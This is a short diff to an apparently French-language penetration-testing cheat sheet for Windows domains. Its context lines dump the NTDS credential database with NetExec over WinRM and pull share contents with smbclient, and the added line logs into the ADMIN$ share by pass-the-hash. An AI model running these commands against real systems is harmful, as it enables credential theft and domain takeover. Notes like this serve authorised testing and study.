@@ -24,7 +24,7 @@ nxc winrm $IP -u $USER -p $PASSWORD --ntds --user ADMINISTRATOR ## Dump ntds
 
 ```bash
 smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB
-
+smbclient //$IP/ADMIN$ -U "$DOMAIN/$USER%$NT_HASH" --pw-nt-hash ## Connexion share SMB via passthehash
 ## Pour tout récupérer 
 smb: \> recurse ON  
 smb: \> prompt OFF  
